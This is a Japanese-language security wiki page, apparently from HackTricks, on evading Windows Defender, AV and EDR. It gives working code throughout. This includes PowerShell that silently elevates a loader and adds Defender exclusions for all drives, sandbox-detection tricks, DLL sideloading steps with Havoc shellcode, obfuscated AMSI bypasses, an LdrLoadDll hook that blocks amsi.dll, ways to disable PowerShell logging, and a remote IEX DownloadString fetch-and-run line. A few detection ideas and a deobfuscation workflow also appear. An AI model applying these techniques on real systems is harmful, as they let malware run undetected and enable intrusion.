# Antivirus (AV) のバイパス

{{#include ../banners/hacktricks-training.md}}

**このページの初版は** [**@m2rc_p**](https://twitter.com/m2rc_p)**が執筆しました！**

## Defenderを停止する

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defenderの動作を停止するツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別のAVを装ってWindows Defenderの動作を停止するツール。
- [管理者の場合にDefenderを無効化する](basic-powershell-for-pentesters/README.md)

### Defenderを改変する前のインストーラー風UAC誘導

ゲームチートを装う公開ローダーは、署名のないNode.js/Nexeインストーラーとして配布されることが多く、まず**ユーザーに権限昇格を要求**してからDefenderを無力化します。手順はシンプルです。

1. `net session`で管理者権限の有無を確認します。このコマンドは実行ユーザーが管理者権限を持つ場合にのみ成功するため、失敗すればローダーは標準ユーザーとして実行されています。
2. `RunAs`動詞を使って直ちに自身を再起動し、元のコマンドラインを維持したまま、想定どおりのUAC同意プロンプトを表示します。

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

被害者はすでに「クラック版」ソフトウェアをインストールしようとしていると考えているため、通常はプロンプトを承認し、マルウェアに Defender のポリシーを変更するために必要な権限を与えてしまいます。<sup>[[26]](#references)</sup>

### すべてのドライブ文字に対する一律の `MpPreference` 除外設定

昇格後、GachiLoader のような一連の処理は、サービスを完全に無効化するのではなく、Defender の死角を最大限に広げます。ローダーはまず GUI watchdog（`taskkill /F /IM SecHealthUI.exe`）を強制終了し、次に**極めて広範な除外設定**を適用して、すべてのユーザープロファイル、システムディレクトリ、リムーバブルディスクをスキャン不能にします:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

主な観察結果:

- ループはマウントされているすべてのファイルシステム（D:\、E:\、USBメモリなど）を走査するため、**今後ディスク上のどこに配置されたpayloadも無視されます**。
- `.sys` 拡張子の除外は将来を見越したものです。攻撃者は、Defenderに再度触れることなく、後から署名されていないドライバーを読み込める選択肢を確保しています。
- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` に保存されるため、後続の段階で除外設定が維持されていることを確認したり、UACを再度トリガーせずに除外対象を拡張したりできます。

Defenderのサービスは停止されないため、単純なヘルスチェックでは「antivirus active」と報告され続けますが、実際にはリアルタイム検査がそれらのパスに対して行われません。<sup>[[26]](#references)</sup>

## **AV Evasionの方法論**

現在、AVはファイルが悪意のあるものかどうかを判定するため、静的検知、動的解析、さらに高度なEDRでは振る舞い分析など、さまざまな手法を使用しています。

### **静的検知**

静的検知では、バイナリやスクリプト内の既知の悪意ある文字列やバイト配列を検出し、ファイル自体から情報（ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）を抽出します。そのため、公開されている既知のツールを使うと、解析されて悪意のあるものとしてフラグ付けされている可能性が高く、検出されやすくなります。この種の検知を回避する方法はいくつかあります。

- **暗号化**

バイナリを暗号化すれば、AVがプログラムを検出する手段はなくなりますが、メモリ内でプログラムを復号して実行する何らかのloaderが必要です。

- **難読化**

バイナリやスクリプト内の文字列をいくつか変更するだけでAVをすり抜けられることもありますが、難読化する対象によっては時間のかかる作業になります。

- **独自ツールの開発**

独自のツールを開発すれば、既知の悪意あるシグネチャはありませんが、多くの時間と労力が必要です。

> [!TIP]
> Windows Defenderの静的検知に対する確認には、[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)がおすすめです。このツールはファイルを複数のセグメントに分割し、それぞれをDefenderに個別にスキャンさせます。これにより、バイナリ内でフラグ付けされた文字列やバイトを正確に特定できます。

実践的なAV Evasionについては、この[YouTubeプレイリスト](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)をぜひご覧ください。

### 静的分類器向けのオフラインPE特徴量テスト

パックまたは暗号化されたpayloadのバイト列は、静的分類器が使用する入力の1つにすぎません。EMBER2024は、imports、exports、セクション、ヘッダー、Authenticodeデータなど、PEの特徴量を抽出します。<sup>[[48]](#references)</sup> あるloaderの実験では、良性に見えるimportsを141個追加したところEMBER2024の悪意スコアが93%低下し、マルウェアに関連するimportsを追加するとスコアが上昇しました。これは、そのモデルとサンプルに対する結果であり、特定のAV/EDR製品を確実に回避できることを示すものではありません。<sup>[[50]](#references)</sup>

許可されたloaderのテストでは、payloadと実行経路を固定し、各バリアントで意図したビルド変数を1つだけ変更して、スコアをオフラインで比較してください。ビルドの変更は複数の特徴量グループに影響する場合があるため、生成されたPEの特徴量を確認してください。<sup>[[49]](#references)[[50]](#references)</sup> 意図したimportsをIATに保持するには、到達可能なコードから選択したWin32 APIsを呼び出します。選択内容を変え、ビルドごとに呼び出し箇所を分散させてください。固定の偽装関数を作ると、シグネチャ化される可能性があります。この実験では、有効なコード署名、exportエントリ、`.pdata`を拡大する関数の増加でもスコアが低下したと報告されています。無効な署名の効果はほとんどなく、`.pdata`の効果も小さいものでした。<sup>[[50]](#references)</sup>

`thrember`パッケージは、特徴量抽出とベンチマークモデルを提供します。インストール後、既存の`models`ディレクトリを指定して`thrember.download_models("models")`を実行し、その後、親ディレクトリからスコアラーを実行してください。ダウンロード用ヘルパーはカレントワーキングディレクトリを変更します。PE分類器を使えば、スキャンサービスに送信せずに、ビルドを格納したディレクトリのスコアを計算できます。<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

比較中は、モデルと feature-extractor のバージョンを固定してください。オフラインスコアが低下したとしても、それが示すのは、この classifier が変更されたバイナリにどう反応するかだけです。behavioral analysis、emulation、またはベンダーの別のモデルを回避できた証明にはなりません。<sup>[[49]](#references)[[50]](#references)</sup> [virtualized payloads におけるビルドごとの polymorphism と外側のバイナリの camouflage](virtualized-payload-execution.md#camouflaging-the-outer-go-executable)については、別の execution model を参照してください。

### **Dynamic analysis**

Dynamic analysis とは、AV が sandbox 内でバイナリを実行し、悪意のある活動（例: ブラウザーのパスワードを復号して読み取ろうとする、LSASS の minidump を実行するなど）を監視することです。この部分は少し扱いが難しい場合がありますが、sandbox を回避するためにできることをいくつか紹介します。

- **実行前に Sleep する** 実装方法によっては、AV の dynamic analysis を回避する有効な方法になります。ユーザーの作業を妨げないよう、AV がファイルをスキャンできる時間は非常に短いため、長い Sleep を使うとバイナリの分析を妨害できます。ただし、実装方法によっては、多くの AV sandbox が Sleep をスキップできるという問題があります。
- **マシンのリソースを確認する** 通常、sandbox が使えるリソースは非常に限られています（例: RAM が 2GB 未満）。そうでなければ、ユーザーのマシンの動作を遅くしてしまう可能性があるためです。CPU の温度やファンの回転速度を確認するなど、工夫の余地はほかにもあります。すべての機能が sandbox に実装されているわけではありません。
- **マシン固有のチェック** 「contoso.local」ドメインに参加しているユーザーのワークステーションを標的にしたい場合は、コンピューターのドメインを確認し、指定したものと一致するかを調べられます。一致しなければ、プログラムを終了させることができます。

Microsoft Defender の Sandbox のコンピューター名は HAL9TH であることがわかっています。そのため、detonation の前に malware 内でコンピューター名を確認できます。名前が HAL9TH と一致すれば、Defender の sandbox 内にいるということなので、プログラムを終了させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox に対抗するための、[@mgeeky](https://twitter.com/mariuszbit)による、ほかの優れたヒントを紹介します。

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> の #malware-dev チャンネル</p></figcaption></figure>

この記事で前述したように、**public tools**はいずれ**検出されます**。そのため、次のことを自問してください。

たとえば、LSASS を dump したい場合、**本当に mimikatz を使う必要がありますか**？ それとも、あまり知られていない別のプロジェクトで LSASS を dump できますか？

おそらく後者が正解です。mimikatz を例にすると、AV や EDR に最も多く検出される malware のひとつ、あるいは最も検出される malware かもしれません。プロジェクト自体は非常に優れていますが、AV を回避するために使うのは悪夢のように大変です。達成したいことに応じて、代替手段を探してください。

> [!TIP]
> 回避のために payload を変更する場合は、Defender の**自動サンプル送信をオフにしてください**。また、長期的に回避を実現したいのであれば、**絶対に VIRUSTOTAL にアップロードしないでください**。特定の AV に payload が検出されるか確認したい場合は、VM にインストールし、自動サンプル送信をオフにしてから、結果に納得するまでそこでテストしてください。

## EXEs vs DLLs

可能な場合は、回避のために常に**DLL の使用を優先してください**。私の経験では、DLL ファイルは通常、**検出も分析もされにくい**ため、場合によっては検出を避けるための非常に簡単な手段になります（もちろん、payload が DLL として実行できる仕組みを備えている場合です）。

この画像のとおり、Havoc の DLL Payload は antiscan.me で 4/26 の検出率ですが、EXE payload の検出率は 7/26 です。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>通常の Havoc EXE payload と通常の Havoc DLL の antiscan.me における比較</p></figcaption></figure>

ここからは、DLL ファイルを使ってさらに stealthy にするための方法をいくつか紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading** は、victim application と悪意のある payload を同じ場所に配置し、loader が使用する DLL の検索順序を利用する手法です。

[Siofra](https://github.com/Cybereason/siofra) と次の powershell script を使うと、DLL Sideloading の影響を受けやすいプログラムを調べられます。

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

このコマンドは、"C:\Program Files\\" 内で DLL hijacking の影響を受けるプログラムと、それらが読み込もうとする DLL ファイルの一覧を出力します。

**DLL Hijackable/Sideloadable なプログラムを自分で調査することを強くおすすめします**。適切に行えば、この手法はかなりステルス性が高いですが、公開されている DLL Sideloadable プログラムを使うと、簡単に検知される可能性があります。

プログラムが読み込もうとする名前で悪意のある DLL を配置するだけでは、payload は読み込まれません。プログラムはその DLL 内に特定の関数があることを想定しているためです。この問題を解決するため、**DLL Proxying/Forwarding** と呼ばれる別の手法を使います。

**DLL Proxying** は、プログラムがプロキシ（悪意のある）DLL に対して行う呼び出しを元の DLL に転送します。これにより、プログラムの機能を維持しながら、payload の実行を処理できます。

ここでは、[@flangvik](https://twitter.com/Flangvik/) の [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) プロジェクトを使用します。

以下が実行した手順です。

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

最後のコマンドによって、2つのファイルが生成されます。DLLのソースコードテンプレートと、名前を変更した元のDLLです。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

これらが結果です。

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

私たちのshellcode（[SGN](https://github.com/EgeBalci/sgn)でエンコード）とproxy DLLは、どちらも[antiscan.me](https://antiscan.me)で検出率0/26でした！成功と言ってよいでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloadingについては、[S3cur3Th1sSh1tのtwitch VOD](https://www.twitch.tv/videos/1644171543)と、[ippsecの動画](https://www.youtube.com/watch?v=3eROsG_WNpE)を見ることを**強くおすすめします**。これまでの内容をさらに詳しく学べます。

### Forwarded Exportsの悪用（ForwardSideLoading）

Windows PEモジュールは、実際には「forwarder」である関数をexportできます。コードを指す代わりに、exportエントリには`TargetDll.TargetFunc`という形式のASCII文字列が格納されます。呼び出し側がそのexportを解決すると、Windows loaderは次の処理を行います。

- `TargetDll`がまだロードされていない場合、ロードする
- `TargetFunc`を解決する

理解しておくべき主な動作：
- `TargetDll`がKnownDLLの場合、保護されたKnownDLLs名前空間（例：ntdll、kernelbase、ole32）から提供されます。<sup>[[15]](#references)</sup>
- `TargetDll`がKnownDLLでない場合、通常のDLL検索順序が使われます。この検索順序には、forward解決を行うモジュールのディレクトリも含まれます。

これにより、間接的なsideloadingの手法が可能になります。つまり、KnownDLLではないモジュール名にforwardされる関数をexportする署名済みDLLを見つけ、その署名済みDLLと同じディレクトリに、forward先のモジュール名と完全に同じ名前を付けた攻撃者が制御するDLLを置きます。forwardされたexportが呼び出されると、loaderはforward先を解決し、同じディレクトリから攻撃者のDLLをロードして、DllMainを実行します。<sup>[[13]](#references)</sup>

Windows 11で確認された例：

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決されます。

PoC（コピー＆ペースト）:
1) 署名済みのシステム DLL を書き込み可能なフォルダーにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダーに悪意のある `NCRYPTPROV.dll` を配置します。コード実行には最小限の `DllMain` で十分です。`DllMain` を実行させるために、転送先の関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) 署名済みLOLBinで転送をトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

観測された動作:
- rundll32（署名済み）が、side-by-side の `keyiso.dll`（署名済み）をロードする
- `KeyIsoSetAuditingInterface` の解決時に、ローダーが転送先の `NCRYPTPROV.SetAuditingInterface` をたどる
- その後、ローダーが `C:\test` から `NCRYPTPROV.dll` をロードし、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合でも、「missing API」エラーが発生するのは `DllMain` の実行後

調査のヒント:
- 転送先モジュールが KnownDLL ではない forwarded exports に注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に記載されている。
- 次のようなツールを使って forwarded exports を列挙できる:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を探すには、Windows 11 の forwarder inventory を確認してください：https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

検出/防御のアイデア：
- LOLBins（例：rundll32.exe）がシステム以外のパスから署名済み DLL を読み込み、その後、同じディレクトリから同じベース名の非 KnownDLLs を読み込む動作を監視する
- 次のようなプロセス/モジュールの連鎖を検知する：`rundll32.exe` → システム以外の `keyiso.dll` → ユーザーが書き込み可能なパスにある `NCRYPTPROV.dll`
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの書き込みと実行を拒否する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze は、サスペンドされたプロセス、直接 syscall、代替の実行方法を使って EDR をバイパスするための payload toolkit です`

Freeze を使うと、ステルス性を保ちながら shellcode を読み込んで実行できます。

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasionは猫とネズミの追いかけっこのようなもので、今日有効な方法が明日には検出される可能性があります。そのため、1つのツールだけに頼らず、可能であれば複数のevasion techniqueを組み合わせてください。

## Direct/Indirect Syscalls と SSN 解決 (SysWhispers4)

EDRはしばしば、`ntdll.dll` の syscall stub に **user-mode inline hook** を仕掛けます。これらのhookを回避するには、正しい **SSN** (System Service Number) を読み込み、hookされたexport entrypointを実行せずにkernel modeへ遷移する **direct** または **indirect** syscall stubを生成できます。<sup>[[32]](#references)</sup>

**呼び出し方法:**
- **Direct (embedded)**: 生成したstubに `syscall`/`sysenter`/`SVC #0` 命令を出力します（`ntdll` exportを経由しません）。
- **Indirect**: `ntdll` 内にある既存の `syscall` gadgetへジャンプし、kernelへの遷移が `ntdll` から発生したように見せます（heuristic evasionに有用です）。**randomized indirect** は呼び出しごとにpoolからgadgetを選択します。
- **Egg-hunt**: 静的な `0F 05` opcode sequenceをディスク上に埋め込まず、実行時にsyscall sequenceを解決します。

**hookに耐性のあるSSN解決方法:**
- **FreshyCalls (VA sort)**: stubのバイト列を読み取る代わりに、syscall stubをvirtual address順に並べてSSNを推定します。
- **SyscallsFromDisk**: クリーンな `\KnownDlls\ntdll.dll` をmapし、その `.text` からSSNを読み取ってからunmapします（メモリ上のすべてのhookを回避します）。
- **RecycledGate**: VA順のSSN推定と、stubがクリーンな場合のopcode検証を組み合わせます。hookされている場合はVAによる推定にフォールバックします。
- **HW Breakpoint**: `syscall` 命令にDR0を設定し、VEHを使って実行時に `EAX` からSSNを取得します。hookされたバイト列の解析は不要です。

SysWhispers4の使用例:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSIは「[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作られました。当初、AVがスキャンできるのは**ディスク上のファイル**だけだったため、ペイロードを何らかの方法で**メモリ上で直接**実行できれば、AVは十分な可視性を持たず、阻止できませんでした。

AMSI機能は、Windowsの次のコンポーネントに統合されています。

- User Account Control（UAC）（EXE、COM、MSI、またはActiveXのインストール時の昇格）
- PowerShell（スクリプト、対話的な使用、動的コード評価）
- Windows Script Host（wscript.exeおよびcscript.exe）
- JavaScriptおよびVBScript
- Office VBAマクロ

これにより、スクリプトの内容を復号・難読化解除された状態で公開し、ウイルス対策ソリューションがスクリプトの動作を検査できるようになります。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`を実行すると、Windows Defenderで次のアラートが表示されます。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`に続いて、スクリプトを実行した実行ファイルのパスが付加されていることに注目してください。この例ではpowershell.exeです。

ディスクにはファイルを一切書き込んでいませんが、AMSIによってメモリ上で検知されました。

さらに、**.NET 4.8**以降では、C#コードもAMSIを通して実行されます。これは、メモリ上で実行するために`Assembly.Load(byte[])`で読み込む場合にも影響します。そのため、AMSIを回避しながらメモリ上で実行したい場合は、古いバージョンの.NET（4.7.2以下など）の使用が推奨されます。

AMSIを回避する方法はいくつかあります。

- **Obfuscation**

AMSIは主に静的検知を行うため、読み込もうとするスクリプトを変更することで検知を回避できる場合があります。

ただし、AMSIは複数のレイヤーがあるスクリプトでも難読化を解除できるため、難読化の方法によっては有効な選択肢にならないことがあります。そのため、回避は単純ではありません。一方で、変数名をいくつか変更するだけで回避できることもあるため、どの程度検知対象になっているかによります。

- **AMSI Bypass**

AMSIはDLLをpowershell（cscript.exe、wscript.exeなど）のプロセスに読み込むことで実装されているため、権限のないユーザーとして実行していても簡単に改変できます。このAMSIの実装上の欠陥により、研究者たちはAMSIスキャンを回避する方法を複数発見しています。

**Forcing an Error**

AMSIの初期化を強制的に失敗させる（amsiInitFailed）と、現在のプロセスではスキャンが開始されなくなります。この手法は当初[Matt Graeber](https://twitter.com/mattifestation)によって公開され、広範な利用を防ぐためにMicrosoftはシグネチャを開発しました。

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

PowerShellコードを1行実行するだけで、現在のPowerShellプロセスでAMSIを使用不能にできます。ただし、この行はAMSI自体によって検知されるため、この手法を使うには何らかの変更が必要です。

以下は、この[Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)から入手した、改変済みのAMSI bypassです。

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

これは投稿が公開されると検出される可能性が高いことを念頭に置いてください。そのため、検出を避けるつもりなら、コードを公開しないでください。

**Memory Patching**

この手法は当初、[@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。amsi.dll 内で「AmsiScanBuffer」関数（ユーザーが入力した内容のスキャンを担当）のアドレスを見つけ、E_INVALIDARG のコードを返す命令で上書きします。これにより、実際のスキャン結果は 0 となり、クリーンな結果として解釈されます。

> [!TIP]
> 詳しい説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。

powershell で AMSI をバイパスする手法はほかにも数多くあります。詳しくは[**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass)と[**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)をご覧ください。

### amsi.dll の読み込みを防いで AMSI をブロックする（LdrLoadDll hook）

AMSI は、現在のプロセスに `amsi.dll` が読み込まれた後にのみ初期化されます。堅牢で言語に依存しないバイパス手法は、`ntdll!LdrLoadDll` にユーザーモード hook を設置し、要求されたモジュールが `amsi.dll` の場合にエラーを返すことです。その結果、AMSI は読み込まれず、そのプロセスではスキャンが行われません。<sup>[[23]](#references)</sup>

実装の概要（x64 C/C++ の疑似コード）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
メモ
- PowerShell、WScript/CScript、カスタムローダーなど、通常であればAMSIをロードするものすべてで動作します。
- スクリプトをstdin経由で渡す方法（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせると、長いコマンドラインの痕跡を避けられます。
- `regsvr32`が`DllRegisterServer`を呼び出すなど、LOLBins経由で実行されるローダーでの使用例があります。

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)**ツールも、AMSIをバイパスするスクリプトを生成します。
**[https://amsibypass.com/](https://amsibypass.com/)**ツールもAMSIをバイパスするスクリプトを生成します。ユーザー定義関数、変数、文字式をランダム化し、PowerShellキーワードの大文字・小文字もランダムにすることで、シグネチャを回避します。

**検出されたシグネチャを削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)**や**[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**などのツールを使うと、現在のプロセスのメモリから検出されたAMSIシグネチャを削除できます。このツールは、現在のプロセスのメモリをスキャンしてAMSIシグネチャを探し、NOP命令で上書きすることで、メモリから効果的に削除します。

**AMSIを使用するAV/EDR製品**

AMSIを使用するAV/EDR製品の一覧は、**[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**で確認できます。

**PowerShell version 2を使う**
PowerShell version 2を使うとAMSIがロードされないため、AMSIによるスキャンを受けずにスクリプトを実行できます。次のように実行します。

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell loggingは、システム上で実行されたすべてのPowerShellコマンドを記録できる機能です。監査やトラブルシューティングに役立ちますが、**検知を回避したい攻撃者にとっては問題になることもあります**。

PowerShell loggingを回避するには、次の手法を使用できます。

- **PowerShell TranscriptionとModule Loggingを無効にする**: この目的には、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)などのツールを使用できます。
- **PowerShell version 2を使う**: PowerShell version 2を使用するとAMSIが読み込まれないため、AMSIのスキャンを受けずにスクリプトを実行できます。次のように実行します: `powershell.exe -version 2`
- **Unmanaged PowerShell sessionを使う**: [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)を使用して、`powershell.exe`を起動せずにPowerShellをホストします（Cobalt Strikeの`powerpick`で使われている手法）。これにより、`powershell.exe`プロセスに特化した制御は回避できますが、AMSI、Script Block Logging、またはその他すべてのPowerShell防御が自動的に無効になるわけではありません。どの程度カバーされるかは、ランタイムとホストの実装によって異なります。


## Obfuscation

> [!TIP]
> 複数のobfuscation手法ではデータの暗号化を行うため、バイナリのエントロピーが高くなり、AVやEDRによる検知が容易になります。この点に注意し、暗号化は、機密性が高い、または隠す必要があるコードの特定のセクションにのみ適用することを検討してください。

### ConfuserEx-Protected .NET BinariesのDeobfuscation

ConfuserEx 2（または商用フォーク）を使用したマルウェアを解析する際、逆コンパイラやsandboxを妨げる複数の保護層に直面することはよくあります。以下のワークフローを使うと、**元の状態に近いILを確実に復元**でき、その後dnSpyやILSpyなどのツールでC#に逆コンパイルできます。<sup>[[10]](#references)</sup>

1.  Anti-tamperingの除去 – ConfuserExはすべての*メソッド本体*を暗号化し、*モジュール*のstatic constructor（`<Module>.cctor`）内で復号します。また、PE checksumにもパッチを適用するため、変更を加えるとバイナリがクラッシュします。**AntiTamperKiller**を使って暗号化されたmetadata tableを特定し、XOR keyを復元して、クリーンなassemblyを書き出します:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Outputには、独自のunpackerを作成する際に役立つ6つのanti-tamperパラメーター（`key0-key3`、`nameHash`、`internKey`）が含まれています。

2.  シンボル／control-flowの復元 – *clean*ファイルを**de4dot-cex**（ConfuserEx対応のde4dotフォーク）に渡します。
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   フラグ:
     • `-p crx` – ConfuserEx 2 profileを選択
     • de4dotはcontrol-flow flatteningを元に戻し、元のnamespace、class、変数名を復元して、定数文字列を復号します。

3.  Proxy-call stripping – ConfuserExは、逆コンパイルをさらに困難にするため、直接のメソッド呼び出しを軽量なラッパー（*proxy calls*とも呼ばれます）に置き換えます。これらは**ProxyCall-Remover**で除去します:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   この手順の後は、難読化されたラッパー関数（`Class8.smethod_10` など）ではなく、`Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が確認できるはずです。

4.  手動クリーンアップ – 生成されたバイナリを dnSpy で実行し、大きな Base64 blob や `RijndaelManaged`／`TripleDESCryptoServiceProvider` の使用箇所を検索して、*実際の* payload を特定します。多くの場合、マルウェアは `<Module>.byte_0` 内で初期化される TLV エンコード済みバイト配列として保存しています。

この一連の手順では、悪意のあるサンプルを実行せずに実行フローを復元できます。オフラインのワークステーションで作業する際に便利です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これは IOC として利用し、サンプルを自動的にトリアージできます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/)コンパイルスイートのオープンソースforkを提供し、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)と改ざん防止によってソフトウェアのセキュリティを強化できるようにすることです。
